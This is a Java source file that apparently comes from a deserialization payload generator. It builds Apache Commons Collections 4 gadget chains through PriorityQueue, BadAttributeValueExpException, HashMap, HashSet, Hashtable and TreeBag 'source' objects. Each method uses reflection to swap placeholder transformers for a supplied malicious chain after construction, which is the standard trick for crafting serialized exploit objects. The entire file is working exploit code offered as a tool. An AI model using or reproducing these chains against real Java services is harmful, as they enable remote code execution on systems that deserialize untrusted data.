import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.util.*;

public class Source4 {

    public static PriorityQueue PriorityQueueSource(SinkResult result) throws Exception {

        TransformingComparator comparator = new TransformingComparator(result.transformer4);
        PriorityQueue obj = new PriorityQueue(2);
        if (result.templates != null) {
            Reflections.setFieldValue(obj, "queue", new Object[]{result.templates, 2});
        } else {
            Reflections.setFieldValue(obj, "queue", new Object[]{1, 2});
        }
        Reflections.setFieldValue(obj, "size", 2);
        Reflections.setFieldValue(obj, "comparator", comparator);

        return obj;
    }

    public static BadAttributeValueExpException BadAttributeValueExpExceptionSource(SinkResult result) throws Exception {
        Transformer fakeTransformers = generateFakeTransformers();

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.lazyMap(innerMap, fakeTransformers);
        Object tpl = 1;
        if (result.templates != null) {
            tpl = result.templates;
        }
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, tpl);

        BadAttributeValueExpException obj = new BadAttributeValueExpException(1);

        try {
            Object resultTransformers = Reflections.getFieldValue(result.transformer4, "iTransformers");
            Reflections.setFieldValue(fakeTransformers, "iTransformers", resultTransformers);
        } catch (NullPointerException e) {
            Reflections.setFieldValue(outerMap, "factory", result.transformer4);
        }

        Reflections.setFieldValue(obj, "val", tiedMapEntry);

        return obj;
    }

    public static HashMap HashMapSource(SinkResult result) throws Exception {
        Transformer fakeTransformers = generateFakeTransformers();

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.lazyMap(innerMap, fakeTransformers);
        Object tpl = 1;
        if (result.templates != null) {
            tpl = result.templates;
        }

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, tpl);

        HashMap obj = new HashMap();
        obj.put(tiedMapEntry, "t");
        innerMap.clear();

        Reflections.setFieldValue(outerMap, "factory", result.transformer4);

        return obj;
    }

    public static HashSet HashSetSource(SinkResult result) throws Exception {
        Transformer fakeTransformers = generateFakeTransformers();

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.lazyMap(innerMap, fakeTransformers);
        Object tpl = 1;
        if (result.templates != null) {
            tpl = result.templates;
        }

        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, tpl);

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "t");
        HashSet obj = new HashSet(hashMap.keySet());
        outerMap.clear();

        Reflections.setFieldValue(outerMap, "factory", result.transformer4);

        return obj;
    }

    public static Hashtable HashtableSource(SinkResult result) throws Exception {
        Transformer fakeTransformers = generateFakeTransformers();

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Object tpl = 1;
        if (result.templates != null) {
            tpl = result.templates;
        }

        Map lazyMap1 = LazyMap.lazyMap(innerMap1, fakeTransformers);
        lazyMap1.put("yy", tpl);

        Map lazyMap2 = LazyMap.lazyMap(innerMap2, fakeTransformers);
        lazyMap2.put("zZ", tpl);

        Hashtable obj = new Hashtable();
        obj.put(lazyMap1, tpl);
        obj.put(lazyMap2, tpl);
        lazyMap2.remove("yy");

        try {
            Object resultTransformers = Reflections.getFieldValue(result.transformer4, "iTransformers");
            Reflections.setFieldValue(fakeTransformers, "iTransformers", resultTransformers);
        } catch (NullPointerException e) {
            Reflections.setFieldValue(lazyMap1, "factory", result.transformer4);
            Reflections.setFieldValue(lazyMap2, "factory", result.transformer4);
        }

        return obj;
    }

    public static TreeBag TreeBagSource(SinkResult result) throws Exception {
        Transformer fakeTransformers = generateFakeTransformers();

        TransformingComparator comp = new TransformingComparator(fakeTransformers);
        TreeBag obj = new TreeBag(comp);
        Object tpl = 1;
        if (result.templates != null) {
            tpl = result.templates;
        }
        obj.add(tpl);

        Reflections.setFieldValue(comp, "transformer", result.transformer4);

        return obj;
    }

    private static Transformer generateFakeTransformers() {
        return new ChainedTransformer(new Transformer[]{new ConstantTransformer(0)});
    }


}
